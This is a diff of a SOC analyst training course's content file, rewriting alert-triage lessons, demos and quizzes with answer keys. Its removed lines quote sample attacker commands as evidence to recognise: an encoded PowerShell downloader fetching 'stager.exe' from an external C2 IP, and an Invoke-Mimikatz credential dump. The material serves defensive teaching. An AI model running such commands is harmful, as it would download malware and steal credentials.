+          "title": "Chain of Custody and Evidence Integrity",
+          "scenario": "During a breach investigation, an analyst copies malware samples onto a personal USB drive without hashing or recording dates.",
+          "analystMindset": "In a court of law or regulatory hearing, undocumented evidence is inadmissible. A formal Case guarantees cryptographic hashing (SHA256) and audit logging.",
+          "bestPractices": [
+            "Record SHA-256 hashes of all suspicious binaries and files before interacting with them.",
+            "Never execute unapproved remediations without logging the action in the Case ticket.",
+            "Ensure incident declarations follow the organizational escalation matrix immediately."
+          ]
         },
-        knowledgeCheck: {
-          dragDrop: {
-            title: 'Order the Security Operations Hierarchy',
-            instructions: 'Rank the terms from most granular to broadest operational container.',
-            items: [
-              { id: 'hier-1', label: '1. Event (Single atomic system action)', category: 'Most Granular' },
-              { id: 'hier-2', label: '2. Alert (Threshold or correlation rule triggered)', category: 'Second Level' },
-              { id: 'hier-3', label: '3. Incident (Verified security policy violation)', category: 'Third Level' },
-              { id: 'hier-4', label: '4. Case (Container tracking all alerts, evidence & tasks)', category: 'Broadest Container' },
+        "knowledgeCheck": {
+          "matching": {
+            "title": "Match Definitions: Event, Alert, Incident, Case",
+            "instructions": "Match each term with its correct security operations definition.",
+            "pairs": [
+              {
+                "id": "t1",
+                "left": "Event",
+                "right": "Any observable technical occurrence on host or network"
+              },
+              {
+                "id": "t2",
+                "left": "Alert",
+                "right": "Signal generated by rule matching potential maliciousness"
+              },
+              {
+                "id": "t3",
+                "left": "Incident",
+                "right": "Confirmed security compromise requiring active response"
+              },
+              {
+                "id": "t4",
+                "left": "Case",
+                "right": "Formal documented investigation file tracking evidence and timeline"
+              }
             ],
-            explanation: 'Events feed into Alerts; confirmed alerts become Incidents; all related artifacts are managed inside a Case.',
-          },
-        },
-      },
+            "explanation": "Events are raw facts; Alerts are filtered warnings; Incidents are confirmed attacks; Cases are documented investigation records."
+          }
+        }
+      }
     ],
-    assessment: {
-      id: 'unit-2-assessment',
-      title: 'Unit 2 Assessment: Alerts & Events',
-      passingScore: 80,
-      xpReward: 150,
-      questions: [
+    "assessment": {
+      "id": "unit-2-assessment",
+      "title": "Unit 2 Assessment: Alerts & Events Mastery",
+      "passingScore": 75,
+      "xpReward": 100,
+      "questions": [
         {
-          id: 'u2-q1',
-          question: 'What is the key difference between a raw Event and a security Alert?',
-          options: [
-            'Events are stored on USB drives while alerts are printed on paper',
-            'An event is any observed system action; an alert is generated only when an event matches a detection rule',
-            'Events only happen on Linux; alerts only happen on Windows',
-            'There is no difference; the two words mean the exact same thing',
+          "id": "u2-q1",
+          "question": "What distinguishes a security Alert from a raw security Event?",
+          "options": [
+            "Events are always malicious, whereas alerts are benign",
+            "An alert is generated when an event (or correlation of events) triggers a detection rule",
+            "Events only come from firewalls, while alerts come from antivirus",
+            "Alerts are stored in cold storage while events are displayed on dashboards"
           ],
-          correctAnswer: 1,
-          explanation: 'Events are raw occurrences (billions daily); alerts are high-priority notifications generated by correlation rules.',
+          "correctAnswer": 1,
+          "explanation": "Events are raw operational records; an alert is generated only when events meet specific detection or threshold rules."
         },
         {
-          id: 'u2-q2',
-          question: 'When does a security alert formally become classified as an Incident?',
-          options: [
-            'When the alert is older than 30 days',
-            'When an analyst investigates and confirms that an active threat or policy breach has actually occurred',
-            'When the company CEO sends an email asking for an update',
-            'When the alert rule is deleted from the SIEM',
+          "id": "u2-q2",
+          "question": "Under what condition should a Tier 1 analyst declare a formal Security Incident?",
+          "options": [
+            "Immediately whenever any alert is received in the queue",
+            "When triage investigation confirms that unauthorized, malicious, or policy-violating activity has occurred",
+            "Only after senior management approves via email",
+            "Only if the company stock price drops"
           ],
-          correctAnswer: 1,
-          explanation: 'An alert becomes an incident when human or automated triage confirms it is a genuine, harmful security event.',
+          "correctAnswer": 1,
+          "explanation": "An incident is declared once verification confirms true malicious intent or unauthorized impact on assets."
         },
         {
-          id: 'u2-q3',
-          question: 'What is the purpose of a Case in an incident management system (e.g. ServiceNow, TheHive)?',
-          options: [
-            'It serves as the unified folder holding all related alerts, evidence, affected assets, and analyst notes',
-            'It encrypts the hard drive so nobody can read the logs',
-            'It automatically deletes all emails from the attacker',
-            'It prevents the analyst from logging out of their computer',
+          "id": "u2-q3",
+          "question": "What is the primary operational purpose of opening an investigation Case in the ticketing system?",
+          "options": [
+            "To delete old event logs and save disk space",
+            "To track investigation evidence, timeline, actions taken, and legal chain of custody",
+            "To prevent other analysts from seeing the alert",
+            "To automatically reset all passwords across the domain"
           ],
-          correctAnswer: 0,
-          explanation: 'A Case aggregates all alerts, forensic artifacts, timeline notes, and tasks related to a single attack campaign.',
+          "correctAnswer": 1,
+          "explanation": "A Case serves as the formal repository documenting forensic evidence, actions, timeline, and post-incident remediation."
         },
         {
-          id: 'u2-q4',
-          question: 'What dangerous condition occurs when a SIEM produces excessive irrelevant or noisy alerts?',
-          options: [
-            'Hardware overheating',
-            'Alert fatigue, causing analysts to miss real critical attacks',
-            'Instant network bandwidth failure',
-            'Immediate data encryption',
+          "id": "u2-q4",
+          "question": "If an enterprise generates 50,000,000 firewall events per day, why does the SOC not investigate each event individually?",
+          "options": [
+            "Firewall events are always encrypted and cannot be viewed",
+            "The vast majority are legitimate, routine network traffic; correlation rules filter for anomalous threat patterns to prevent analyst overwhelm",
+            "Firewalls are not part of SOC monitoring",
+            "Analysts only work 2 hours a day"
           ],
-          correctAnswer: 1,
-          explanation: 'Alert fatigue desensitizes analysts, leading to delayed response times and missed intrusions.',
-        },
-        {
-          id: 'u2-q5',
-          question: 'Which of the following is an example of a confirmed Incident rather than a benign Event?',
-          options: [
-            'An employee resets their password via the official self-service portal',
-            'A scheduled cron job backs up database tables at midnight',
-            'Ransomware binaries actively encrypting files on the departmental file server',
-            'A web browser loads an image from a reputable advertising CDN',
-          ],
-          correctAnswer: 2,
-          explanation: 'Active file encryption on a corporate server is an undeniable, high-severity security incident.',
-        },
-      ],
-    },
+          "correctAnswer": 1,
+          "explanation": "Filtering and correlation rules reduce millions of routine events into a manageable queue of high-probability candidate alerts."
+        }
+      ]
+    }
   },
-
-  // =========================================================================
-  // UNIT 3: ALERT TRIAGE
-  // =========================================================================
   {
-    id: 'unit-3',
-    unitNumber: 3,
-    title: 'Unit 3: Alert Triage',
-    description: 'Master the frontline triage methodology: dissecting alert logic, identifying key entities (User, Host, IP), analyzing raw evidence, and executing hands-on triage.',
-    estimatedHours: 2.5,
-    topics: [
+    "id": "unit-3",
+    "unitNumber": 3,
+    "title": "Unit 3: Alert Triage",
+    "description": "Master systematic alert triage: understand the alert signature, extract core entities (User, Host, IP), verify evidence, and investigate real-world attacks.",
+    "estimatedHours": 0.58,
+    "topics": [
       {
-        id: 'topic-3-1',
-        unitId: 'unit-3',
-        title: 'Understanding the Alert & Checking Evidence',
-        order: 1,
-        estimatedMinutes: 20,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'Alert triage is the systematic evaluation of an incoming alert within the first 5 to 15 minutes of detection.',
-            'Step 1: Understand the Alert Logic. Read the rule description, triggered condition, and associated MITRE ATT&CK technique (e.g., T1059.001 - PowerShell).',
-            'Step 2: Inspect the Raw Telemetry & Evidence. Do not trust the alert title alone; check the process execution command line, parent process, and file hashes.',
-            'Step 3: Check for Obfuscation. Attackers frequently use base64 encoding, environment variables, or string reversal to hide malicious payloads.',
-            'Step 4: Form an Initial Hypothesis. Is this execution consistent with normal user duties or signs of an active living-off-the-land intrusion?',
+        "id": "topic-3-1",
+        "unitId": "unit-3",
+        "title": "Chapter 1: Open the Alert — The 5 Critical Fields",
+        "order": 1,
+        "estimatedMinutes": 15,
+        "xpReward": 50,
+        "theory": {
+          "summaryLines": [
+            "10:47 AM at FinCorp Boston SOC: Alert #SEC-2024-10847 flashes amber-red on your queue: 'Multiple Failed Login Attempts Followed by Host Probe'.",
+            "The Pressure: Shift Lead Marcus Vance stops at your desk: 'Got anything hot on 10847? Standup with the CISO is in 5 minutes. Give me a read in 60 seconds.'",
+            "The Overload Trap: The alert contains 28 lines of raw SIEM JSON—hex codes, GUIDs, and timestamps. Junior analysts freeze trying to read it all; senior analysts use the 5-Field Framework.",
+            "The 5 Critical Anchors: In the first 60 seconds, exactly 5 fields matter: WHO (Target Account), WHAT (Target Asset), WHERE (Source IP), WHEN (Timestamp), and HOW MANY (Attempt Count).",
+            "The Threat Story: Extracting these 5 fields transforms chaos into a defensible briefing: 'External IP 198.51.100.47 made 5 rapid failed logins against our Domain Controller FINCORP-DC01 targeting jdavis.'"
           ],
-          knowMore: {
-            title: 'SANS Triage Playbook: The First 15 Minutes',
-            description: 'Standard operating procedures for rapid initial alert dissection and evidence verification.',
-            externalUrl: 'https://www.sans.org/',
-            externalLabel: 'Explore SANS Incident Response Resources',
-          },
+          "knowMore": {
+            "title": "SANS Triage Playbook: The 5-Field Framework for Alert Qualification",
+            "description": "Learn how top-tier enterprise SOCs extract WHO, WHAT, WHERE, WHEN, and HOW MANY within 60 seconds to eliminate triage paralysis.",
+            "externalUrl": "https://www.sans.org/blog/soc-alert-triage-methodology/",
+            "externalLabel": "SANS Alert Triage Guide"
+          }
         },
-        demo: {
-          title: 'Dissecting an Alert Payload',
-          subtitle: 'Step-by-step deconstruction of an obfuscated command-line alert.',
-          steps: [
+        "demo": {
+          "title": "[Demo] The 60-Second Alert Triage",
+          "subtitle": "Watch an analyst face Alert #SEC-2024-10847, conquer information overload, and extract the 5 critical fields under shift lead pressure",
+          "steps": [
             {
-              stepNumber: 1,
-              title: 'The Inbound Alert Header',
-              description: 'Alert Title: "Suspicious PowerShell Encoded Script Execution" flagged on finance workstation.',
-              visualType: 'dashboard',
-              highlightElements: ['alert-header', 'severity-high'],
-              narration: 'The analyst opens the alert record and inspects the raw triggering event.',
+              "id": 1,
+              "stage": "1. Ingestion & Panic",
+              "iconName": "siem",
+              "title": "Alert #SEC-2024-10847 Arrives Raw",
+              "description": "A wall of 28 JSON fields lands on your screen. Shift Lead Marcus Vance asks: 'What've we got in 60 seconds?'",
+              "telemetrySnippet": "ALERT #SEC-2024-10847: Rule='Multiple Failed Logins' | Priority=MEDIUM | RawFields=28 | Status=NEW",
+              "highlightText": "Do NOT read line-by-line. 75% of raw SIEM fields are for compliance and audit trails, not initial triage."
             },
             {
-              stepNumber: 2,
-              title: 'Decoding the Evidence',
-              description: 'Raw payload: `powershell -nop -w hidden -enc SQBFAFgA...` decoded reveals `Invoke-WebRequest -Uri http://185.220.101.5/stager.exe`.',
-              visualType: 'terminal',
-              highlightElements: ['decoded-script', 'c2-ip'],
-              narration: 'Evidence confirms an active downloader retrieving second-stage malware from an external C2 server.',
+              "id": 2,
+              "stage": "2. Extract WHO & WHAT",
+              "iconName": "analyst",
+              "title": "Anchor 1 & 2: Target User & Target Host",
+              "description": "Analyst extracts TargetUserName 'jdavis' (Commercial Loan Underwriter) and Computer 'FINCORP-DC01' (Primary Domain Controller).",
+              "telemetrySnippet": "WHO: TargetUserName=jdavis | WHAT: Computer=FINCORP-DC01.fincorp.local (Tier-0 Domain Controller)",
+              "highlightText": "Targeting a Domain Controller immediately elevates operational concern—this is critical enterprise infrastructure."
             },
-          ],
+            {
+              "id": 3,
+              "stage": "3. Extract WHERE",
+              "iconName": "server",
+              "title": "Anchor 3: Source Network Address",
+              "description": "Analyst isolates IpAddress '198.51.100.47'. This is a public external IP, NOT an internal office subnet.",
+              "telemetrySnippet": "WHERE: IpAddress=198.51.100.47 | Subnet=Public WAN (External) | Internal=NO | Port=54218",
+              "highlightText": "Private IPs (10.x.x.x, 192.168.x.x) suggest internal noise; public IPs mean an external entity is knocking at the gate."
+            },
+            {
+              "id": 4,
+              "stage": "4. Extract WHEN & HOW MANY",
+              "iconName": "attacker",
+              "title": "Anchor 4 & 5: Time Window & Attempt Count",
+              "description": "Analyst notes 5 failed attempts (Event ID 4625, SubStatus 0xC000006A) tightly clustered within 90 seconds starting at 14:30:12 EST.",
+              "telemetrySnippet": "WHEN: 2024-01-15 14:30:12 - 14:31:45 EST | HOW MANY: 5 failed attempts | LogonType: 3 (Network)",
+              "highlightText": "5 rapid network logons in 90 seconds indicate automated script probing, not a human typo."
+            },
+            {
+              "id": 5,
+              "stage": "5. Deliver Lead Briefing",
+              "iconName": "endpoint",
+              "title": "Deliver the 18-Second Briefing to Marcus",
+              "description": "Analyst briefs Marcus with calm confidence: 'External IP 198.51.100.47 made 5 failed network logons against DC01 targeting jdavis in 90s. All blocked; escalating to L2 for perimeter firewall block.'",
+              "telemetrySnippet": "BRIEFING COMPLETE: Time Taken=18s | Verdict=True Positive Probe | Escalation=L2 Firewall Block Initiated",
+              "highlightText": "You went from information overload to calm, credible analyst in under 60 seconds."
+            }
+          ]
         },
-        interactive: {
-          title: 'Evidence Inspector: Base64 & Process Trees',
-          scenario: 'Examine raw evidence fields from 3 alerts to determine which contains actionable malicious artifacts.',
-          cards: [
+        "interactive": {
+          "title": "[Interactive] FinCorp Case #SEC-2024-10847 Triage Workbench",
+          "scenario": "Marcus Vance is standing at your desk. Click the 5 critical fields in Alert #SEC-2024-10847 to pin them to your investigation panel and formulate your briefing.",
+          "cards": [
             {
-              id: 'card-evid1',
-              title: 'Payload Analysis: Base64 Decoded',
-              source: 'Process Line Inspection',
-              timestamp: '11:14:02 UTC',
-              category: 'host',
-              summary: 'Decoded script reveals command: `Invoke-Mimikatz -DumpCreds` targeting LSASS memory.',
-              details: [
-                { label: 'Attacker Intent', value: 'Credential Theft / Memory Dump' },
-                { label: 'Verdict', value: 'High Confidence Malicious True Positive' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 99,
-              tags: ['Mimikatz', 'Evidence', 'Credential-Dumping'],
+              "id": "ent-who",
+              "category": "User",
+              "label": "WHO (Account): jdavis@fincorp.local",
+              "summary": "Jane Davis, Senior Commercial Loan Underwriter.",
+              "detailedFindings": "Extracted Entity: User = jdavis. High-value business identity with loan access. No active password reset requested.",
+              "severityIndicator": "Normal"
             },
             {
-              id: 'card-evid2',
-              title: 'Parent-Child Process Relationship',
-              source: 'Endpoint Process Hierarchy',
-              timestamp: '11:14:05 UTC',
-              category: 'host',
-              summary: 'Parent: `excel.exe` -> Child: `cmd.exe` -> Grandchild: `powershell.exe`.',
-              details: [
-                { label: 'Anomaly', value: 'Spreadsheet software should never spawn command-line shells' },
-                { label: 'Verdict', value: 'Macro-based Initial Stager Execution' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 95,
-              tags: ['Process-Tree', 'Malicious', 'Macro'],
+              "id": "ent-what",
+              "category": "Event ID",
+              "label": "WHAT (Host): FINCORP-DC01",
+              "summary": "Primary Active Directory Domain Controller.",
+              "detailedFindings": "Extracted Entity: Host = FINCORP-DC01.fincorp.local. Tier-0 Crown Jewel server. An attack here threatens enterprise auth.",
+              "severityIndicator": "Malicious"
             },
             {
-              id: 'card-evid3',
-              title: 'Software Updater Process Execution',
-              source: 'System Maintenance Task',
-              timestamp: '11:15:00 UTC',
-              category: 'host',
-              summary: 'Parent: `services.exe` -> Child: `GoogleUpdate.exe` with valid digital signature.',
-              details: [
-                { label: 'Digital Signature', value: 'Valid Google LLC Certificate' },
-                { label: 'Verdict', value: 'Routine Benign System Activity' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 10,
-              tags: ['Benign', 'Signed', 'Update'],
+              "id": "ent-where",
+              "category": "Source IP",
+              "label": "WHERE (Source IP): 198.51.100.47 (External)",
+              "summary": "Public WAN address originating outside the corporate firewall.",
+              "detailedFindings": "Extracted Entity: Source IP = 198.51.100.47. External untrusted host. GeoIP resolves to unassigned bulletproof hosting provider.",
+              "severityIndicator": "Suspicious"
             },
-          ],
+            {
+              "id": "ent-when",
+              "category": "Timeline",
+              "label": "WHEN (Time): 14:30:12 - 14:31:45 EST",
+              "summary": "Active afternoon business hours (Boston SOC time).",
+              "detailedFindings": "Extracted Entity: Time Window = 93 seconds total duration. All attempts clustered within minutes of alert trigger.",
+              "severityIndicator": "Normal"
+            },
+            {
+              "id": "ent-howmany",
+              "category": "Event ID",
+              "label": "HOW MANY (Volume): 5 Failed Logons (Event 4625)",
+              "summary": "5 sequential network logon failures with bad password codes.",
+              "detailedFindings": "Extracted Entity: Event Count = 5. SubStatus 0xC000006A (Bad password). LogonType 3 (Network). Consistent with automated password spray.",
+              "severityIndicator": "Suspicious"
+            }
+          ]
         },
-        socContext: {
-          title: 'Never Rely on Alert Names Alone',
-          scenario: 'An alert named "Generic Windows Warning" was dismissed by an inexperienced analyst, masking a multi-stage ransomware staging attack.',
-          analystMindset: 'Alert titles are generated by rule authors; the ground truth resides exclusively inside the raw process telemetry and network socket logs.',
-          bestPractices: [
-            'Always inspect full command-line arguments, including encoded or concatenated strings.',
-            'Verify digital signatures on executing binaries before assuming legitimacy.',
-            'Examine parent-child process relationships for unnatural anomalies (e.g. Office apps spawning shells).',
-          ],
+        "socContext": {
+          "title": "The FinCorp 60-Second Standup Briefing",
+          "scenario": "Marcus Vance is standing at your desk with 60 seconds on the clock before his CISO standup. Junior analysts say 'I am still reading the logs.' Trained analysts deliver the 5-field sentence.",
+          "analystMindset": "Never read an alert line-by-line. Extract the 5 anchors first, build the threat story, verify account impact, and take decisive operational action.",
+          "bestPractices": [
+            "Check asset criticality first: an attack on a Domain Controller (FINCORP-DC01) commands immediate priority over a guest Wi-Fi laptop.",
+            "Verify RFC 1918 private subnets (10.x.x.x, 192.168.x.x) vs external public IPs to separate internal user typos from external adversaries.",
+            "Calculate the attempt rate: human typing mistakes occur once or twice; automated credential attacks hit 5+ times in under two minutes."
+          ]
         },
-        knowledgeCheck: {
-          matching: {
-            title: 'Match Evidence Artifacts to Investigation Meaning',
-            instructions: 'Pair each evidence artifact with what it tells the triage analyst.',
-            pairs: [
-              { id: 'tri-1', left: 'Parent: WINWORD.EXE -> Child: powershell.exe', right: 'Malicious macro document execution' },
-              { id: 'tri-2', left: 'Base64 encoded string with `-enc` flag', right: 'Obfuscated command hiding attacker intent' },
-              { id: 'tri-3', left: 'Digital Signature: Verified Microsoft Windows', right: 'Legitimate OS component (verify for DLL hijacking)' },
-              { id: 'tri-4', left: 'Outbound HTTP GET request to raw external IP', right: 'Potential Command & Control (C2) beacon or stager download' },
+        "knowledgeCheck": {
+          "dragDrop": {
+            "title": "Sequence the 5 Critical Triage Anchors",
+            "instructions": "Arrange the 5 triage fields in the logical order an analyst evaluates them to build an incident narrative.",
+            "items": [
+              {
+                "id": "fa-1",
+                "label": "WHO: Identify Targeted Account & Privilege Level (TargetUserName)",
+                "order": 1
+              },
+              {
+                "id": "fa-2",
+                "label": "WHAT: Identify Target Host & Asset Criticality (Computer Name)",
+                "order": 2
+              },
+              {
+                "id": "fa-3",
+                "label": "WHERE: Identify Originating IP & Network Boundary (Source IP)",
+                "order": 3
+              },
+              {
+                "id": "fa-4",
+                "label": "WHEN: Establish Incident Time Window & Business Context (Timestamp)",
+                "order": 4
+              },
+              {
+                "id": "fa-5",
+                "label": "HOW MANY: Measure Attack Frequency & Automation Pattern (Event Count)",
+                "order": 5
+              }
             ],
-            explanation: 'Recognizing process tree anomalies and obfuscation patterns allows analysts to validate true threats quickly.',
-          },
-        },
+            "explanation": "Evaluating WHO is targeted and WHAT system is hit establishes asset criticality, followed by WHERE (origin), WHEN (timeline), and HOW MANY (automation velocity) to complete the threat story."
+          }
+        }
       },
       {
-        id: 'topic-3-2',
-        unitId: 'unit-3',
-        title: 'Entity Identification & Basic Triage Lab',
-        order: 2,
-        estimatedMinutes: 25,
-        xpReward: 60,
-        theory: {
-          summaryLines: [
-            'Every alert investigation revolves around 4 core investigative entities: User, Host, IP, and Evidence.',
-            '1. Identify User: Who was logged in? Is it an administrative service account or an end user? Is the activity normal for their job role?',
-            '2. Identify Host: What machine was affected? Workstation, database server, or domain controller? What is its asset criticality tier?',
-            '3. Identify IP: Source and destination IP addresses. Is the destination internal RFC-1918 or an untrusted external bulletproof host?',
-            '4. Check Evidence: Validate timestamps, process hashes, and command lines against threat intelligence sources (VirusTotal, AlienVault OTX).',
-            'Once all 4 entities are identified and cross-checked, the analyst delivers the triage verdict: True Positive (Escalate) or False Positive (Close).',
+        "id": "topic-3-2",
+        "unitId": "unit-3",
+        "title": "Chapter 2: Check Evidence & [Lab] 🔵 Basic Alert Triage",
+        "order": 2,
+        "estimatedMinutes": 20,
+        "xpReward": 75,
+        "theory": {
+          "summaryLines": [
+            "Once entities are identified, the analyst must check corroborating evidence to prove or disprove malicious activity.",
+            "Process Lineage: Examine parent-child relationships (e.g. WINWORD.EXE spawning powershell.exe is a classic malicious execution chain).",
+            "Command Line Parameters: Decode Base64 strings, analyze switches (-w hidden, -nop, -enc), and look for obfuscation techniques.",
+            "File System & Hashes: Look up SHA-256 hashes in EDR and VirusTotal; verify if files were created in temporary directories (%AppData%, %Temp%).",
+            "Network Flows: Corroborate endpoint process activity with firewall or proxy logs to verify data transfer volumes."
           ],
-          knowMore: {
-            title: 'MITRE D3FEND: Model for Defensive Cyber Operations',
-            description: 'Learn how identifying digital artifacts supports precise defensive countermeasures.',
-            externalUrl: 'https://d3fend.mitre.org/',
-            externalLabel: 'Browse MITRE D3FEND Framework',
-          },
+          "knowMore": {
+            "title": "MITRE ATT&CK: T1059 Command and Scripting Interpreter Triage",
+            "description": "Learn how to detect and investigate living-off-the-land script interpreters used by initial access brokers.",
+            "externalUrl": "https://attack.mitre.org/techniques/T1059/",
+            "externalLabel": "MITRE ATT&CK T1059"
+          }
         },
-        demo: {
-          title: 'The 4-Pillar Entity Extraction',
-          subtitle: 'Isolating User, Host, IP, and Evidence from raw SIEM JSON logs.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'Entity Mapping in Raw Logs',
-              description: 'The analyst pulls the raw JSON log and extracts `user.name: jdoe-finance`, `host.name: WKSTN-FIN-042`, and `destination.ip: 185.220.101.5`.',
-              visualType: 'terminal',
-              highlightElements: ['user-field', 'host-field', 'ip-field'],
-              narration: 'Entity mapping turns confusing JSON syntax into a clear human story.',
-            },
-            {
-              stepNumber: 2,
-              title: 'The Triage Decision',
-              description: 'With user context, high asset risk, and malicious external C2 IP verified, the alert is declared a True Positive.',
-              visualType: 'dashboard',
-              highlightElements: ['verdict-true-positive', 'escalate-button'],
-              narration: 'The analyst escalates to Tier 2 with clear entity documentation.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] Look Beyond the Alert",
+                  "subtitle": "Watch the analyst examine supporting chronological evidence to determine what actually happened",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Beyond the Alert",
+                                      "iconName": "siem",
+                                      "title": "Alert is a Starting Point, Not Proof",
+                                      "description": "An alert highlights an anomaly, but does not provide the verdict. Analyst opens the event log timeline.",
+                                      "telemetrySnippet": "SEARCH: index=security host=FIN-PC-04 earliest=10:30:00 latest=10:35:00",
+                                      "highlightText": "Never close or escalate an alert based solely on the summary banner—inspect the supporting events."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. The Failure Sequence",
+                                      "iconName": "attacker",
+                                      "title": "Chronological Failed Attempts",
+                                      "description": "10:31:40 (Failed), 10:31:44 (Failed), 10:31:47 (Failed), 10:31:52 (Failed). SubStatus 0xC000006A (Bad Password).",
+                                      "telemetrySnippet": "10:31:40 - 10:31:52: Four rapid Event 4625 records from local console.",
+                                      "highlightText": "Failure codes reveal whether the username was invalid or the password was mistyped."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. The Crucial Turning Point",
+                                      "iconName": "endpoint",
+                                      "title": "Successful Logon at 10:32:05",
+                                      "description": "Thirteen seconds after the last failure, Windows Event 4624 (Logon Success) is logged for Finance01 from the same PC.",
+                                      "telemetrySnippet": "10:32:05 - Event 4624 (Logon Success) | LogonType=2 (Interactive) | User=Finance01",
+                                      "highlightText": "A successful interactive login immediately following failures strongly suggests user typo correction."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Correlate User Context",
+                                      "iconName": "server",
+                                      "title": "Employee Contacted IT Helpdesk",
+                                      "description": "Helpdesk ticketing system records a ticket from Finance01 at 10:30 AM stating 'Caps Lock was stuck on keyboard.'",
+                                      "telemetrySnippet": "HELPDESK CORRELATION: Ticket #HD-44102 | User: Finance01 | Note: Caps lock keyboard issue resolved",
+                                      "highlightText": "Correlating helpdesk tickets and user confirmation turns ambiguous data into verified certainty."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Triage Conclusion",
+                                      "iconName": "analyst",
+                                      "title": "Benign User Error (False Positive)",
+                                      "description": "Alert + Evidence + Context shows a user password mistype rather than external adversary penetration.",
+                                      "telemetrySnippet": "TRIAGE VERDICT: Benign False Positive | Root Cause: User Typo / Caps Lock | Closure Approved",
+                                      "highlightText": "Investigating context eliminates unnecessary escalations and protects analyst focus."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Hands-On Lab: Basic Alert Triage',
-          scenario: 'A high-priority SIEM alert has fired. Inspect the raw log, extract the 4 critical entities, and deliver your triage verdict.',
-          cards: [
-            {
-              id: 'card-lab-log',
-              title: 'Raw SIEM Log Record [Alert #ALT-4491]',
-              source: 'CrowdStrike / Sysmon Event ID 1',
-              timestamp: '14:28:19 UTC',
-              category: 'host',
-              summary: '`powershell.exe -NoP -NonI -W Hidden -Enc SUVY...` executed on host `WKSTN-FIN-042` by `CORP\\jdoe-finance`. Outbound socket to `185.220.101.5:443`.',
-              details: [
-                { label: 'User Account', value: 'jdoe-finance (Finance Specialist)' },
-                { label: 'Workstation', value: 'WKSTN-FIN-042 (Windows 11 Pro)' },
-                { label: 'Destination IP', value: '185.220.101.5 (Known C2 Infrastructure)' },
-                { label: 'Parent Process', value: 'excel.exe (PID 4812)' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 100,
-              tags: ['Lab-Evidence', 'Entity-Extraction', 'Triage'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Follow the Evidence",
+                  "scenario": "Examine the timeline evidence. Select the key evidence items that matter for deciding the alert disposition.",
+                  "cards": [
+                            {
+                                      "id": "ev-fails",
+                                      "category": "Timeline",
+                                      "label": "10:31:40 - 10:31:52: Rapid Failed Logins",
+                                      "summary": "4 failed logon attempts in 12 seconds with error 'Bad Password'.",
+                                      "detailedFindings": "Key Evidence: Demonstrates the exact frequency and nature of the failed authentications.",
+                                      "severityIndicator": "Suspicious"
+                            },
+                            {
+                                      "id": "ev-success",
+                                      "category": "Event ID",
+                                      "label": "10:32:05: Event 4624 (Logon Success)",
+                                      "summary": "Successful interactive console logon from the exact same workstation.",
+                                      "detailedFindings": "Key Evidence: Proves the legitimate user was physically present and successfully logged in.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "ev-src",
+                                      "category": "Source IP",
+                                      "label": "Source IP 10.10.20.15 (Assigned Desk)",
+                                      "summary": "Source IP matches employee's assigned physical desk workstation on the corporate LAN.",
+                                      "detailedFindings": "Key Evidence: Rules out external adversary access or unauthorized network bridging.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "ev-noise",
+                                      "category": "User",
+                                      "label": "Display Driver Telemetry (1920x1080)",
+                                      "summary": "Routine graphics monitor resolution update logged by display adapter.",
+                                      "detailedFindings": "De-emphasized: Peripheral telemetry unrelated to authentication security analysis.",
+                                      "severityIndicator": "Normal"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'The Impact of Missing Entity Context',
-          scenario: 'An analyst documented an alert as "malware found on a computer" without noting the hostname or user account.',
-          analystMindset: 'Without the hostname or IP, the incident response team could not locate or isolate the machine, giving the attacker 6 additional hours inside the network.',
-          bestPractices: [
-            'Always capture both NetBIOS hostname and internal IP address, as DHCP addresses change over time.',
-            'Cross-reference the user account against HR directory records to verify department and normal activity patterns.',
-            'Defang all malicious indicators (`hxxp://`, `192[.]168...`) to prevent accidental clicks.',
-          ],
+        "socContext": {
+          "title": "Decisive Triage Under SLA Pressure",
+          "scenario": "An alert must be triaged within 15 minutes. The analyst finds an encoded script but cannot decode all 4,000 characters immediately.",
+          "analystMindset": "Triage does not require full reverse-engineering; it requires proving or disproving malicious intent. WINWORD spawning PowerShell downloading external binaries is 100% True Positive.",
+          "bestPractices": [
+            "Isolate the host immediately via EDR when execution of an unknown dropper is confirmed.",
+            "Export process execution command lines directly into the incident ticket.",
+            "Collect RAM and triage packages before rebooting the compromised asset."
+          ]
         },
-        knowledgeCheck: {
-          dragDrop: {
-            title: 'Map Entities to their Investigative Value',
-            instructions: 'Match each entity with the primary question it answers during triage.',
-            items: [
-              { id: 'ent-1', label: 'User Account (e.g. jdoe-finance)', category: 'Answers: WHO' },
-              { id: 'ent-2', label: 'Hostname & Internal IP (e.g. WKSTN-FIN-042)', category: 'Answers: WHERE' },
-              { id: 'ent-3', label: 'Remote IP & Domain (e.g. 185.220.101.5)', category: 'Answers: WHENCE / C2' },
-              { id: 'ent-4', label: 'Command-Line Payload & File Hash', category: 'Answers: WHAT HAPPENED' },
+        "knowledgeCheck": {
+          "triageScenario": {
+            "id": "ts-triage-lab",
+            "alertName": "Alert ALT-2026-04: Multiple Failed Logins Followed by Success",
+            "severity": "HIGH",
+            "scenarioText": "User Finance01 on host FIN-PC-04 recorded 8 consecutive failed logon attempts (Event 4625) within 45 seconds, immediately followed by 1 successful logon (Event 4624) from external IP 198.51.100.25 (a known Tor exit node).",
+            "evidenceItems": [
+              {
+                "label": "Target User & Host",
+                "value": "Finance01 @ FIN-PC-04",
+                "insight": "Corporate finance payroll workstation"
+              },
+              {
+                "label": "Logon Sequence",
+                "value": "8x Event 4625 (Bad Password) -> 1x Event 4624",
+                "insight": "Credential guessing / password spray pattern"
+              },
+              {
+                "label": "Source IP Intel",
+                "value": "198.51.100.25 (Tor Exit Node)",
+                "insight": "Anonymized external address, non-corporate VPN"
+              }
             ],
